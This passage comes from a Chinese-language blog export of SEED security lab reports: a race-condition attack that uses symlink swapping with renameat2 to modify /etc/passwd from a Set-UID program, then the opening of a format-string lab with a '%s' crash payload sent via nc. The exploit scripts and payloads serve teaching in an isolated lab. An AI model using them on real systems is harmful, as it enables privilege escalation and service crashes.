我们的攻击可能需要一段时间才能成功修改密码文件，因此我们需要一种方法来自动检测攻击是否成功。有很多方法可以做到这一点；一种简单的方法是监视文件的时间戳。下面的shell脚本运行<code>ls-l</code>命令，该命令输出有关文件的多条信息，包括上次修改的时间。通过将命令的输出与之前生成的输出进行比较，我们可以判断文件是否已被修改。<br>​        下面的shell脚本使用echo命令（通过管道）提供的输入，在循环中运行易受攻击的程序（<code>vulp</code>）。您需要决定实际输入的内容。如果攻击成功，即修改<code>passwd</code>，shell脚本将停止。你需要有点耐心。通常，你应该能够在5分钟内成功。</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br>CHECK_FILE=&quot;ls -l /etc/passwd&quot;<br>old=$($CHECK_FILE)<br>new=$($CHECK_FILE)<br>while [ &quot;$old&quot; == &quot;$new&quot; ] Ù Check if /etc/passwd is modified<br>do<br>    echo &quot;your input&quot; | ./vulp Ù Run the vulnerable program<br>    new=$($CHECK_FILE)<br>done<br>echo &quot;STOP... The passwd file has been changed&quot;<br></code></pre></div></td></tr></table></figure><h4 id="实验操作-5"><a href="#实验操作-5" class="headerlink" title="实验操作"></a>实验操作</h4><ol><li><p>编译并运行<code>attack_process.c</code></p><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211204402355.png" alt="image-20211211204402355"></p></li><li><p>更改<code>target_process.sh</code>中的输入部分：</p><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211204607627.png" alt="image-20211211204607627"></p></li><li><p>执行脚本<code>target_process.sh</code>，开始攻击：</p><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211204649657.png" alt="image-20211211204649657">    </p><div class="hljs code-wrapper"><pre><code class="hljs"> ### 验证成功</code></pre></div></li></ol><p>​        当脚本终止时，通过以测试用户身份登录并验证root权限来测试利用漏洞的成功性。然后在启动程序的终端窗口中按Ctrl-C键终止攻击程序。</p><h4 id="实验操作-6"><a href="#实验操作-6" class="headerlink" title="实验操作"></a>实验操作</h4><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211204814280.png" alt="image-20211211204814280"></p><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211204938452.png" alt="image-20211211204938452"><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211204959569.png" alt="image-20211211204959569"></p><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><p>​        如果10分钟后，您的攻击仍未成功，则可以停止攻击，并检查<code>/tmp/XYZ</code>文件的所有权。如果此文件的所有者成为root用户，请手动删除此文件，然后重试攻击，直到攻击成功。请在实验室报告中记录这一观察结果。在任务2.C中，我们将解释原因并提供一种改进的攻击方法。</p><h3 id="4-3任务2-C：一种改进的攻击方法"><a href="#4-3任务2-C：一种改进的攻击方法" class="headerlink" title="4.3任务2.C：一种改进的攻击方法"></a>4.3任务2.C：一种改进的攻击方法</h3><p>​        在任务 2.B 中，如果您已正确完成所有操作，但仍无法成功攻击，请检查 <code>/tmp/XYZ</code> 的所有权。 您会发现 <code>/tmp/XYZ</code> 的所有者已成为 root（通常应该是seed）。 如果发生这种情况，您的攻击将永远不会成功，因为您的攻击程序以seed的权限运行，无法再删除或<code>unlink()</code>它。 这是因为 <code>/tmp</code> 文件夹有一个“粘性”位，这意味着只有文件的所有者才能删除该文件，即使该文件夹是全局可写的。<br>​        在任务 2.B 中，我们让您使用 root 的权限删除 <code>/tmp/XYZ</code>，然后再次尝试您的攻击。而不希望的情况随机发生，因此通过重复攻击（在 root 的“帮助”下），您最终将在任务 2.B 中取得成功。 显然，从 root 获取帮助并不是真正的攻击。 我们想摆脱它，并在没有 root 帮助的情况下做到这一点。<br>​        这种不良情况的主要原因是我们的攻击程序有问题，竞争条件问题，正是我们试图在受害者程序中利用的问题。 （真讽刺！）<br>​        攻击程序在删除 <code>/tmp/XYZ</code>（即 unlink()）之后，而在将名称链接到另一个文件（即 <code>symlink()</code>）之前立即切换上下文。删除现有符号链接并创建新符号链接的操作不是原子性的（它涉及两个单独的系统调用）。因此，如果上下文切换发生在中间（即在删除 <code>/tmp/XYZ</code> 之后），并且目标 Set-UID 程序有机会运行其 <code>fopen(fn, &quot;a+&quot;)</code>语句，它将创建一个以 root 为所有者的新文件。 之后，您的攻击程序将无法再更改 <code>/tmp/XYZ</code>。<br>​        基本上，使用 <code>unlink()</code> 和 <code>symlink()</code> 方法，我们的攻击程序中存在竞争条件。因此，当我们试图利用目标程序中的竞争条件时，目标程序可能会意外地“利用”我们攻击程序中的竞争条件，从而击败我们的攻击。<br>​        为了解决这个问题，我们需要使 <code>unlink()</code> 和 <code>symlink()</code> 原子化。 幸运的是，有一个系统调用可以让我们实现这一点。 更准确地说，它允许我们原子地交换两个符号链接。 下面的程序首先创建两个符号链接 <code>/tmp/XYZ</code> 和 <code>/tmp/ABC</code>，然后使用 <code>renameat2</code> 系统调用来原子地切换它们。 这允许我们在不引入任何竞争条件的情况下更改 <code>/tmp/XYZ</code> 指向的内容。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags = RENAME_EXCHANGE;<br>    unlink(<span class="hljs-string">&quot;/tmp/XYZ&quot;</span>); symlink(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>);<br>    unlink(<span class="hljs-string">&quot;/tmp/ABC&quot;</span>); symlink(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, <span class="hljs-string">&quot;/tmp/ABC&quot;</span>);<br>    renameat2(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;/tmp/ABC&quot;</span>, flags);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <br>&#125;<br></code></pre></div></td></tr></table></figure><p><strong>任务</strong>：请使用此新策略修改您的攻击程序，然后再次尝试您的攻击。 如果一切都正确完成，您的攻击应该能够成功。</p><h4 id="实验操作-7"><a href="#实验操作-7" class="headerlink" title="实验操作"></a>实验操作</h4><ol><li><p>更改<code>attack_process.c</code>如下，编译并运行<code>attack_process.c</code></p><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211211310806.png" alt="image-20211211211310806"></p></li><li><p>执行脚本<code>target_process.sh</code>，开始攻击：</p><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211211414604.png" alt="image-20211211211414604"></p></li><li><p>攻击成功：</p><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211213612436.png" alt="image-20211211213612436"></p></li></ol><h2 id="5-任务-3：关于对策"><a href="#5-任务-3：关于对策" class="headerlink" title="5 任务 3：关于对策"></a>5 任务 3：关于对策</h2><h2 id="5-1-任务-3-A：应用最小权限原则"><a href="#5-1-任务-3-A：应用最小权限原则" class="headerlink" title="5.1 任务 3.A：应用最小权限原则"></a>5.1 任务 3.A：应用最小权限原则</h2><p>​        本实验室易受攻击程序的根本问题是违反最小权限原则。 程序员确实明白运行程序的用户可能太强大了，所以他/她引入了 access() 来限制用户的权力。 然而，这不是正确的方法。 更好的方法是应用最小权限原则； 即，如果用户不需要某些权限，则需要禁用该权限。        我们可以使用 <code>seteuid</code> 系统调用暂时禁用 root 权限，然后在必要时启用它。<br>​        请使用此方法修复程序中的漏洞，然后重复您的攻击。 你能成功吗？ 请报告您的观察并提供解释。暂时关闭root权限</p><h3 id="实验操作-8"><a href="#实验操作-8" class="headerlink" title="实验操作"></a>实验操作</h3><ol><li><p>更改<code>vulp.c</code>如下，重新编译，设置为root所有的<code>setuid</code>程序：</p><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211213724915.png" alt="image-20211211213724915"></p><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211213859715.png" alt="image-20211211213859715"></p></li><li><p>按照任务2.C的操作进行攻击：</p><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211214035163.png" alt="image-20211211214035163"></p><ul><li>无法成功</li></ul></li><li><p>原因：调用open()时没有root权限打开<code>/tmp/X</code>指向的受保护的文件<code>passwd</code>。</p></li></ol><h2 id="5-2-任务-3-B：使用-Ubuntu-的内置方案"><a href="#5-2-任务-3-B：使用-Ubuntu-的内置方案" class="headerlink" title="5.2 任务 3.B：使用 Ubuntu 的内置方案"></a>5.2 任务 3.B：使用 Ubuntu 的内置方案</h2><p>​        Ubuntu 10.10 和更高版本带有一个内置的保护方案，可以防止竞争条件攻击。 在此任务中，您需要使用以下命令重新打开保护：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">// On Ubuntu 16.04 and 20.04, use the following command: <br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo sysctl -w fs.protected_symlinks=1</span><br></code></pre></div></td></tr></table></figure><p>​        在保护开启后进行攻击。 请描述您的观察。 请同时解释以下内容： (1) 该保护方案是如何运作的？  (2) 该方案的局限性是什么？</p><h3 id="实验操作-9"><a href="#实验操作-9" class="headerlink" title="实验操作"></a>实验操作</h3><ol><li><p>打开保护：</p><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211214522375.png" alt="image-20211211214522375"></p></li><li><p>使用任务2的<code>vulp.c</code>，重新攻击：</p><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211214611103.png" alt="image-20211211214611103"></p><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211214644501.png" alt="image-20211211214644501"></p><p><img src="/2021/12/11/Race_Condition_Vulnerability_Lab/image-20211211214706604.png" alt="image-20211211214706604"></p><ul><li>攻击失败</li></ul></li><li><p>原因：当设置粘滞位比特后，只有文件所有者、目录所有者或root用户才能重命名或删除粘滞目录中的文件。<code>/tmp</code>目录设置了粘滞位比特。当粘滞符号保护开启后，全局可写的粘滞目录（如<code>tmp</code>）中的符号链接的所有者，与跟随者和目录所有者的其中之一相匹配时才能被跟随。</p><p>本次竞态条件攻击中，漏洞程序以root权限运行，即跟随者为root，<code>/tmp</code>目录的所有者也是root，但是符号链接所有者时攻击者本身（seed）。所以系统不允许程序使用该符号链接。</p><p>局限性：仅适用于<code>/tmp</code>这样的粘滞目录。</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>软件安全实验</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件安全实验</tag>
      
      <tag>计算机安全导论</tag>
      
      <tag>SeedUbuntu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Format String Attack Lab</title>
    <link href="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
    <url>/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</url>
    
    <content type="html"><![CDATA[<h1 id="Format-String-Attack"><a href="#Format-String-Attack" class="headerlink" title="Format String Attack"></a><a href="https://seedsecuritylabs.org/Labs_20.04/Software/Format_String/">Format String Attack</a></h1><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1 概述"></a>1 概述</h2><p>​        C语言中的<code>printf()</code>函数用于根据格式打印出字符串。它的第一个参数称为格式字符串，它定义了字符串的格式。 格式字符串使用由 % 字符标记的占位符用于<code>printf()</code> 函数在打印期间填充数据。 格式字符串的使用不仅限于<code>printf()</code> 函数； 许多其他函数，例如 <code>sprintf()</code>、<code>fprintf()</code> 和 <code>scanf()</code>，也使用格式字符串。 某些程序允许用户以格式字符串提供全部或部分内容。 如果这些内容没有被清理干净，恶意用户就可以利用这个机会让程序运行任意代码。 这样的问题称为格式字符串漏洞。</p><p>​        本实验的目的是通过将从课堂上学到的关于漏洞的知识付诸行动，获得有关格式字符串漏洞的第一手经验。 我们将获得一个带有格式字符串漏洞的程序，任务是利用该漏洞实现以下破坏：（1）程序崩溃，（2）读取程序内存，（3）修改程序内存，最严重的是，（4）注入并使用受害者程序的特权执行恶意代码。 本实验涵盖以下主题：</p><ul><li>格式化字符串漏洞和代码注入 </li><li>堆栈布局 </li><li>Shellcode </li><li>反向shell</li></ul><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul><li>SEED Ubuntu 20.04 VM</li></ul><h2 id="2-环境配置"><a href="#2-环境配置" class="headerlink" title="2 环境配置"></a>2 环境配置</h2><h3 id="2-1-改变对策"><a href="#2-1-改变对策" class="headerlink" title="2.1 改变对策"></a>2.1 改变对策</h3><p>​        现代操作系统使用地址空间随机化来随机化堆和栈的起始地址。 这使得猜测确切地址变得困难； 猜测地址是格式字符串攻击的关键步骤之一。 为了简化本实验中的任务，我们使用以下命令关闭地址随机化：</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sudo sysctl -w kernel.randomize_va_space=0<br></code></pre></div></td></tr></table></figure><h4 id="实验操作"><a href="#实验操作" class="headerlink" title="实验操作"></a>实验操作</h4><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204101734182.png" alt="image-20211204101734182"></p><h3 id="2-2-易受攻击的程序"><a href="#2-2-易受攻击的程序" class="headerlink" title="2.2 易受攻击的程序"></a>2.2 易受攻击的程序</h3><p>​        本实验中使用的易受攻击的程序名为<code>format.c</code>，可以在server-code文件夹中找到。 这个程序有一个格式字符串漏洞，你的工作就是利用这个漏洞。 下面列出的代码删除了非必要信息，因此它与从实验设置文件中获得的不同。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> target = <span class="hljs-number">0x11223344</span>;<br><span class="hljs-type">char</span> *secret = <span class="hljs-string">&quot;A secret message\n&quot;</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">myprintf</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br><span class="hljs-comment">// This line has a format-string vulnerability</span><br><span class="hljs-built_in">printf</span>(msg);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">1500</span>];<br><span class="hljs-type">int</span> length = fread(buf, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">char</span>), <span class="hljs-number">1500</span>, <span class="hljs-built_in">stdin</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Input size: %d\n&quot;</span>, length);<br>myprintf(buf);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>上述程序从标准输入中读取数据，然后将数据传递给<code>myprintf()</code>，后者调用<code>printf()</code>将数据打印出来。 将输入数据馈送到<code>printf()</code>函数的方式是不安全的，并且会导致格式字符串漏洞。 我们将利用这个漏洞。</li><li>该程序将在具有 root 权限的服务器上运行，其标准输入将被重定向到服务器和远程用户之间的 TCP 连接。 因此，该程序实际上是从远程用户那里获取数据的。 如果用户可以利用此漏洞，则可能会造成损害。</li></ul><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>​        我们将把格式化程序编译成 32 位和 64 位二进制文件。 我们预先构建的 Ubuntu 20.04 VM 是 64 位 VM，但它仍然支持 32 位二进制文件。 我们需要做的就是在<code>gcc</code>命令中使用<code>-m32</code>选项。对于 32 位编译，我们还使用<code>-static</code>生成静态链接的二进制文件，它是自包含的，不依赖于任何动态库，因为 32 位动态库未安装在我们的容器中。</p><p>​        <code>Makefile</code>中已经提供了编译命令。 要编译代码，需要键入<code>make</code>来执行这些命令。 编译完成后，我们需要将二进制文件复制到<code>fmt-containers</code>文件夹中，以便容器可以使用它们。 以下命令进行编译安装。</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">make install</span><br></code></pre></div></td></tr></table></figure><ul><li>在编译过程中，将看到一条警告消息。 此警告是由<code>gcc</code>编译器针对格式字符串漏洞实施的对策生成的。我们现在可以忽略这个警告。</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">format.c: In function ’myprintf’: <br>format.c:33:5: warning: format not a string literal and no format arguments [-Wformat-security] <br>33 | printf(msg); <br>   | ˆ˜˜˜˜˜<br></code></pre></div></td></tr></table></figure><ul><li>需要注意的是，该程序需要使用<code>-z execstack</code>选项进行编译，该选项允许堆栈可执行。 我们的最终目标是将代码注入服务器程序的堆栈中，然后触发代码。 不可执行堆栈是针对基于堆栈的代码注入攻击的对策，但可以使用返回到<code>libc</code>技术来击败它，另一个SEED实验对此进行了介绍。 在本实验中，为简单起见，我们禁用了这种可击败的对策。</li></ul><h4 id="关于Server-Program"><a href="#关于Server-Program" class="headerlink" title="关于Server Program"></a>关于Server Program</h4><p>​        在 server-code 文件夹中，可以找到一个名为<code>server.c</code>的程序。这是服务器的主要入口点。它监听9090端口，当它接收到一个TCP连接时，它调用格式化程序，并将TCP连接设置为格式化程序的标准输入。这样，<code>format</code>从<code>stdin</code>读取数据时，实际上是从TCP连接中读取的，即数据是由用户在TCP客户端提供的。学生无需阅读<code>server.c</code>的源代码。</p><p>​        服务器程序中添加了一点随机性，因此不同的学生可能会看到内存地址和帧指针的不同值。 这些值只有在容器重新启动时才会改变，所以只要保持容器运行，就会看到相同的数字（不同学生看到的数字仍然不同）。 这种随机性不同于地址随机化对策。它的唯一目的是让学生的工作有所不同。</p><h4 id="实验操作-1"><a href="#实验操作-1" class="headerlink" title="实验操作"></a>实验操作</h4><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204101933264.png" alt="image-20211204101933264"></p><h3 id="2-3-容器设置"><a href="#2-3-容器设置" class="headerlink" title="2.3 容器设置"></a>2.3 容器设置</h3><p>​        进入 <code>Labsetup</code>文件夹，使用<code>docker-compose.yml</code>文件设置实验室环境。</p><ul><li>下面，我们列出一些与 Docker 和 Compose 相关的常用命令。 由于我们将非常频繁地使用这些命令，因此我们在<code>.bashrc</code>文件（在我们提供的 SEEDUbuntu 20.04 VM 中）中为它们创建了别名。</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker-compose build <span class="hljs-comment"># Build the container image</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker-compose up <span class="hljs-comment"># Start the container</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker-compose down <span class="hljs-comment"># Shut down the container</span></span><br><br>// Aliases for the Compose commands above<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">dcbuild <span class="hljs-comment"># Alias for: docker-compose build</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">dcup <span class="hljs-comment"># Alias for: docker-compose up</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">dcdown <span class="hljs-comment"># Alias for: docker-compose down</span></span><br></code></pre></div></td></tr></table></figure><ul><li>所有容器都将在后台运行。 要在容器上运行命令，我们通常需要在该容器上获得一个 shell。 我们首先需要使用<code>docker ps</code>命令找出容器的ID，然后使用<code>docker exec</code>在该容器上启动一个shell。 在<code>.bashrc</code>文件中为它们创建了别名。</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">dockps // Alias <span class="hljs-keyword">for</span>: docker ps --format <span class="hljs-string">&quot;&#123;&#123;.ID&#125;&#125; &#123;&#123;.Names&#125;&#125;&quot;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docksh &lt;<span class="hljs-built_in">id</span>&gt; // Alias <span class="hljs-keyword">for</span>: docker <span class="hljs-built_in">exec</span> -it &lt;<span class="hljs-built_in">id</span>&gt; /bin/bash</span><br>// The following example shows how to get a shell inside hostC<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">dockps</span><br>b1004832e275 hostA-10.9.0.5<br>0af4ea7a3e2e hostB-10.9.0.6<br>9652715c8e0a hostC-10.9.0.7<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">docksh 96</span><br>root@9652715c8e0a:/#<br>// Note: If a docker command requires a container ID, you do not need to<br>// type the entire ID string. Typing the first few characters will<br>// be sufficient, as long as they are unique among all the containers.<br></code></pre></div></td></tr></table></figure><h4 id="实验操作-2"><a href="#实验操作-2" class="headerlink" title="实验操作"></a>实验操作</h4><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204102043165.png" alt="image-20211204102043165"></p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204102121805.png" alt="image-20211204102121805"></p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211204102145074.png" alt="image-20211204102145074"></p><ul><li><p>容器<code>fmt-server-1</code>(server-10.9.0.5)，<code>fmt-server-2</code>(server-10.9.0.6)创建完成。</p></li><li><p>接下来在容器server-10.9.0.5上获得shell：</p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201124911369.png" alt="image-20211201124911369"></p></li></ul><h2 id="3-任务1：使程序崩溃"><a href="#3-任务1：使程序崩溃" class="headerlink" title="3 任务1：使程序崩溃"></a>3 任务1：使程序崩溃</h2><p>当我们使用包含的<code>docker-compose.yml</code>文件启动容器时，将启动两个容器，每个容器运行一个易受攻击的服务器。 对于此任务，我们将使用运行在 10.9.0.5 上的服务器，该服务器运行具有格式字符串漏洞的 32 位程序。 让我们首先向该服务器发送一条良性消息。 我们将看到目标容器打印出以下消息（看到的实际消息可能会有所不同）。</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> hello | nc 10.9.0.5 9090</span><br>Press Ctrl+C<br>// Printouts on the container’s console<br>server-10.9.0.5 | Got a connection from 10.9.0.1<br>server-10.9.0.5 | Starting format<br>server-10.9.0.5 | Input buffer (address): 0xffffd2d0<br>server-10.9.0.5 | The secret message’s address: 0x080b4008<br>server-10.9.0.5 | The target variable’s address: 0x080e5068<br>server-10.9.0.5 | Input size: 6<br>server-10.9.0.5 | Frame Pointer inside myprintf() = 0xffffd1f8<br>server-10.9.0.5 | The target variable’s value (before): 0x11223344<br>server-10.9.0.5 | hello<br>server-10.9.0.5 | (ˆ_ˆ)(ˆ_ˆ) Returned properly (ˆ_ˆ)(ˆ_ˆ)<br>server-10.9.0.5 | The target variable’s value (after): 0x11223344<br></code></pre></div></td></tr></table></figure><p>服务器将接受您提供的最多 1500 字节的数据。 在本实验中的主要工作是构建不同的payloads来利用服务器中的格式字符串漏洞，从而实现每个任务中指定的目标。 如果将payloads保存在文件中，则可以使用以下命令将有效负载发送到服务器。</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> &lt;file&gt; | nc 10.9.0.5 9090</span> <br>Press Ctrl+C if it does not exit.<br></code></pre></div></td></tr></table></figure><h3 id="具体任务"><a href="#具体任务" class="headerlink" title="具体任务"></a>具体任务</h3><p>​        向服务器提供一个输入，这样当服务器程序试图在<code>myprintf()</code>函数中打印出用户输入时，它会崩溃。 您可以通过查看容器的打印输出来判断格式化程序是否崩溃。如果<code>myprintf()</code>返回，它将打印出“Returned properly”和几个笑脸。 如果没有看到它们，则格式化程序可能已崩溃。</p><p>​        但是，服务器程序不会崩溃；崩溃的格式化程序在服务器程序产生的子进程中运行。</p><p>​        由于本实验中构建的大多数格式化字符串可能很长，因此最好使用程序来执行此操作。 在attack-code目录中，一个名为build string.py的示例代码展示了如何将各种类型的数据放入一个字符串中。</p><h3 id="实验操作-3"><a href="#实验操作-3" class="headerlink" title="实验操作"></a>实验操作</h3><ol><li><p>编写一个生成格式化字符串的python程序<code>task1.py</code>。运行它，使格式化字符串（750个“%s”）保存在<code>badfile1</code>中</p><p>（格式规定符是%s，printf()函数把获得到的值视为一个地址，并打印出该地址处的字符串。而栈帧保存的值并不都是合法的地址，它们可能是0(null指针)、）</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#task1.py</span><br><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br>N = <span class="hljs-number">1500</span><br>content = <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x0</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(N))<br>s = <span class="hljs-string">&quot;%s&quot;</span>*<span class="hljs-number">750</span><br>fmt  = (s).encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br>content[<span class="hljs-number">0</span>:<span class="hljs-number">0</span>+<span class="hljs-built_in">len</span>(fmt)] = fmt<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;badfile1&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>  f.write(content)<br></code></pre></div></td></tr></table></figure><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201150434142.png" alt="image-20211201150434142"></p></li><li><p>向服务器server-10.9.0.5提供输入，输入为<code>badfile1</code>的内容。可以看到服务器端没有打印出“Returned properly”和几个笑脸，故格式化程序已崩溃。</p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201150450719.png" alt="image-20211201150450719"></p><p><img src="/2021/12/04/Format_String_Attack_%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/image-20211201150559167.png" 